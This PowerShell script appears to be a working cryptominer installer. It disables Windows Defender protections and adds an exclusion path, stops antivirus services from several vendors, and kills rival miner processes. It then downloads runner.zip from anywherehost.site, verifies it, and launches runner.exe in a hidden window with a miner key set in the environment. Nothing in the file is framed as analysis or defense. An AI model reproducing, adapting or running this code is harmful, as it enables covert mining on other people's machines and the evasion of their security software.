function Find-WritableDirectory {
    param (
        [switch]$ReturnToOriginal = $false
    )
    
    # Save current directory to return later if needed
    $originalPath = $pwd.Path
    
    # Define directories to check (in priority order)
    $directoriesToCheck = @(
        "C:\Temp",  # Possible temp location
        "D:\Temp",  # Another possible temp location
        $([System.Environment]::GetEnvironmentVariable('USERPROFILE')),
        $([System.Environment]::GetEnvironmentVariable('TEMP')),  # Temp directory
        $([System.Environment]::GetEnvironmentVariable('TMP')),  # Alternative temp
        $pwd.Path,  # Current directory
        "C:\Windows\Temp"  # Windows temp
    )
    
    # Function to test write permission
    function Test-WritePermission {
        param ([string]$Path)
        if ($Path -like "*\system32\config\systemprofile*") {
            Write-Host "[*] Skipping system profile directory: $Path"
            return $false
        }
        if (-not (Test-Path -Path $Path -PathType Container)) {
            try {
                New-Item -Path $Path -ItemType Directory -Force -ErrorAction Stop | Out-Null
                Write-Host "[+] Created directory: $Path"
            } catch {
                Write-Host "[-] Failed to create directory: $Path"
                return $false
            }
        }
        
        $testFile = Join-Path -Path $Path -ChildPath "write_test_$(Get-Random).tmp"
        try {
            $null = New-Item -Path $testFile -ItemType File -ErrorAction Stop
            Remove-Item -Path $testFile -Force -ErrorAction SilentlyContinue
            return $true
        } catch {
            Write-Host "[-] Write test failed for: $Path"
            return $false
        }
    }
    
    # Test each directory
    foreach ($dir in $directoriesToCheck) {
        if ([string]::IsNullOrEmpty($dir)) {
            continue
        }
        Write-Host "[*] Testing directory permissions: $dir"
        if (Test-WritePermission -Path $dir) {
            Write-Host "[+] Found writable directory: $dir"
            Set-Location -Path $dir
            
            if ($ReturnToOriginal) {
                # Return to original directory if flag is set
                Set-Location -Path $originalPath
            }
            
            return $dir
        }
    }
    
    # If no writable directory found, return to original and return $null
    Write-Host "[-] No writable directory found, using current directory"
    if ($ReturnToOriginal) {
        Set-Location -Path $originalPath
    }
    return $null
}

function Test-NetworkConnectivity {
    param(
        [string]$TestUrl = "http://anywherehost.site/xms/1xb",
        [string]$ExpectedContent = "123"
    )
    
    Write-Host "[*] Testing network connectivity..."
    Write-Host "[*] Test URL: $TestUrl"
    
    try {
        $response = Invoke-WebRequest -Uri $TestUrl -UseBasicParsing -TimeoutSec 10
        
        # 将字节数组转换为字符串
        if ($response.Content -is [byte[]]) {
            $content = [System.Text.Encoding]::UTF8.GetString($response.Content).Trim()
        } else {
            $content = $response.Content.ToString().Trim()
        }
        if ($content -eq $ExpectedContent) {
            return $true
        } else {
            return $false
        }
    }
    catch {
        Write-Warning "[-] Network test failed - $_"
        return $false
    }
}

function Disable-WindowsDefender {
    Write-Host "[*] Attempting to disable Windows Defender..."
    try {
        $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
        if (-not $isAdmin) {
            Write-Warning "[-] Administrator privileges required to disable Windows Defender"
            return $false
        }
        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop
        Write-Host "[+] Real-time protection disabled"
        Set-MpPreference -MAPSReporting Disabled -ErrorAction Stop
        Write-Host "[+] Cloud protection disabled"
        Set-MpPreference -SubmitSamplesConsent NeverSend -ErrorAction Stop
        Write-Host "[+] Sample submission disabled"
        $currentDir = $pwd.Path
        Add-MpPreference -ExclusionPath $currentDir -ErrorAction Stop
        Write-Host "[+] Added exclusion path: $currentDir"
        
        Write-Host "[+] Windows Defender temporarily disabled"
        return $true
    }
    catch {
        Write-Warning "[-] Failed to disable Windows Defender: $_"
        return $false
    }
}

function Stop-CommonAntivirus {
    Write-Host "[*] Attempting to stop common antivirus services..."
    
    $avServices = @(
        'avp',           # Kaspersky
        'McShield',      # McAfee
        'avgnt',         # Avira
        'avguard',       # Avira
        'avastsvc',      # Avast
        'mbamservice',   # Malwarebytes
        'SBAMSvc',       # Vipre
        'SAVService'     # Sophos
    )
    
    $stoppedServices = @()
    
    foreach ($service in $avServices) {
        try {
            $svc = Get-Service -Name $service -ErrorAction SilentlyContinue
            if ($svc -and $svc.Status -eq 'Running') {
                Stop-Service -Name $service -Force -ErrorAction Stop
                $stoppedServices += $service
                Write-Host "[+] Stopped service: $service"
            }
        }
        catch {
            Write-Host "[*] Could not stop service $service : $_"
        }
    }
    
    if ($stoppedServices.Count -gt 0) {
        Write-Host "[+] Stopped $($stoppedServices.Count) antivirus services"
        return $true
    } else {
        Write-Host "[*] No antivirus services found to stop"
        return $false
    }
}

function Remove-XmrigProcess {
    Write-Host "[*] Searching for high CPU xmrig processes..."

    $allWhitelist = @(
        'runner',
        'smss'
    )

    
    Write-Host "[*] Whitelist: $($allWhitelist -join ', ')"

    $killedCount = 0
    
    try {
        $processes1 = Get-Process | Select-Object Id, Name, CPU
        Start-Sleep -Milliseconds 500
        $processes2 = Get-Process | Select-Object Id, Name, CPU
        
        $highCpuPids = @()
        foreach ($p2 in $processes2) {
            $p1 = $processes1 | Where-Object { $_.Id -eq $p2.Id }
            if ($p1 -and $p2.CPU -and $p1.CPU) {
                $cpuDelta = $p2.CPU - $p1.CPU
                if ($cpuDelta -gt 0.25) {
                    $processName = $p2.Name -replace '\.exe$', ''
                    $isWhitelisted = $false
                    foreach ($whiteItem in $allWhitelist) {
                        if ($processName -like $whiteItem) {
                            $isWhitelisted = $true
                            Write-Host "[*] Skipping whitelisted process: $($p2.Name) (PID: $($p2.Id))"
                            break
                        }
                    }
                    
                    if (-not $isWhitelisted) {
                        $highCpuPids += $p2.Id
                        Write-Host "[*] High CPU process: $($p2.Name) (PID: $($p2.Id))"
                    }
                }
            }
        }
        
        if ($highCpuPids.Count -eq 0) {
            Write-Host "[*] No high CPU processes found"
            return 0
        }
        
        $wmiProcesses = Get-WmiObject Win32_Process | Where-Object { $highCpuPids -contains $_.ProcessId }
        
        foreach ($proc in $wmiProcesses) {
            $processName = $proc.Name
            $processId = $proc.ProcessId
            $commandLine = $proc.CommandLine
            $executablePath = $proc.ExecutablePath
            
            Write-Host "[+] Found high CPU process:"
            Write-Host "    Name: $processName"
            Write-Host "    PID: $processId"
            Write-Host "    Path: $executablePath"
            Write-Host "    CommandLine: $commandLine"
            
            Stop-Process -Id $processId -Force -ErrorAction SilentlyContinue
            Write-Host "[+] Killed process: $processName (PID: $processId)"
            $killedCount++
        }
        
        if ($killedCount -gt 0) {
            Write-Host "[+] Total xmrig processes killed: $killedCount"
        } else {
            Write-Host "[*] No xmrig processes found in high CPU processes"
        }
    }
    catch {
        Write-Warning "[-] Error: $_"
    }

    return $killedCount
}

function xmsInstall
{
    param($KEY)
    sc.exe stop c3pool_miner >$null
    sc.exe delete c3pool_miner >$null
    sc.exe stop jin_miner >$null
    sc.exe delete jin_miner >$null
    
    # 删除xmrig进程
    Remove-XmrigProcess | Out-Null
    $DIR = Find-WritableDirectory
    if ($DIR) {
        Write-Host "[+] Working directory changed to: $DIR"
    } else {
        Write-Host "[-] No writable directory found, continuing in current directory"
        return
    }
    Set-Location $DIR
    Write-Host "[+] DIR: $($pwd.Path)"
    Write-Host "[+] UID: $KEY"
    Stop-Process -Name 'runner.exe' 2>$null
    Stop-Process -Name 'jin.exe' 2>$null
    Remove-Item  -Force -Recurse (Join-Path -Path $DIR -ChildPath "cache") 2>$null
    Remove-Item  -Force -Recurse (Join-Path -Path $DIR -ChildPath ".xms") 2>$null
    Remove-Item  -Force (Join-Path -Path $DIR -ChildPath "runner.zip") 2>$null
    Get-Process -name runner 2>$null
    if($?){
        Write-Host "Miner is Running To EXIT"
        return
    }
    Write-Host "[+] start install"
    net session >$null 2>$null
    if($?){
        $ADMIN=1
    }else{
        $ADMIN=0
    }
    Write-Host "[+] ADMIN:$ADMIN"
    
    $networkTest = Test-NetworkConnectivity
    if (-not $networkTest) {
        Write-Warning "[-] Network connectivity test failed. The download may be blocked by firewall or proxy."
        return
    }
    
    # close safe
    if ($ADMIN -eq 1) {
        Write-Host "[*] Administrator privileges detected, attempting to disable antivirus..."
        Disable-WindowsDefender | Out-Null
        Stop-CommonAntivirus | Out-Null
    } else {
        Write-Host "[*] No administrator privileges, skipping antivirus control"
    }
    
    try {
        $uri = "http://anywherehost.site/xms/runner.zip"
        $des = Join-Path -Path $DIR -ChildPath "runner.zip"
        Write-Host "[+] Downloading to: $des"
        Invoke-WebRequest -Uri $uri  -UseBasicParsing -OutFile $des
    }
    catch {
        Write-Warning "Download Error: $_"
        return
    }

    $zipPath = Join-Path -Path $DIR -ChildPath "runner.zip"
    if(Test-Path -Path $zipPath -PathType Leaf){
        Write-Host "[+] ZIP IS OK"
    }else{
        Get-ChildItem
        Write-Host "[-] ZIP IS Removed"
        return
    }
    # Unzip
    Write-Host "[+] DIR:$DIR"
    $SourceZip = Join-Path -Path $DIR -ChildPath "runner.zip"
    $DistDir = Join-Path -Path $DIR -ChildPath "cache"
    Write-Host "[+] SourceZip: $SourceZip"
    Write-Host "[+] DistDir: $DistDir"
    try{
        Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory($SourceZip, $DistDir)
        Write-Host "[+] Unzip Ok"
    }
    catch {
        Write-Warning "Error: $_"
        return
    }
    $runnerPath = Join-Path -Path $DistDir -ChildPath "runner.exe"
    Write-Host "[*] Checking for runner.exe at: $runnerPath"
    if(Test-Path -Path $runnerPath -PathType Leaf){
        Write-Host "[+] runner.exe found"
        # 8876b4f04573f74d0fe2c71b5aa67ed3
        try {
            $runnerMD5 = (Get-FileHash -Path $runnerPath -Algorithm MD5).Hash
            $expectedMD5 = "8876B4F04573F74D0FE2C71B5AA67ED3"
            if($runnerMD5 -ne $expectedMD5){
                Write-Warning "[-] runner.exe MD5 verification failed!"
                Write-Warning "    Expected: $expectedMD5"
                Write-Warning "    Actual:   $runnerMD5"
                return
            } else {
                Write-Host "[+] MD5 verification passed"
            }
        } catch {
            Write-Warning "[-] Failed to calculate MD5: $_"
        }
        
        Write-Host "[*] Testing runner.exe execution..."
        try {
            $versionOutput = cmd /c "`"$runnerPath`" -V 2>&1"
            Write-Host "[+] Version check output: $versionOutput"
            Write-Host "[+] Miner Is Ok"
        } catch {
            Write-Warning "[-] Failed to execute runner.exe: $_"
            Write-Error "[-] Miner execution failed"
            return
        }
    } else {
        Write-Host "[*] Listing cache directory contents:"
        Get-ChildItem -Path $DistDir -ErrorAction SilentlyContinue | ForEach-Object { Write-Host "    $($_.Name)" }
        Write-Host "[-] cache\runner.exe was removed by antivirus or not extracted properly"
        return
    }
    
    [System.Environment]::SetEnvironmentVariable("KEY",$KEY)
    [System.Environment]::SetEnvironmentVariable("PASS","x")
    [System.Environment]::SetEnvironmentVariable("LOG",".app.log")
    try{
        Start-Process "runner.exe" -WorkingDirectory cache -WindowStyle Hidden
    } catch {
        Write-Error "Error: $_"
        return
    }
    Get-Process -name runner 2>$null
    if($?){
        Write-Host "[+] start Ok"
    }else{
        Write-Host "[-] Start Error"
    }
}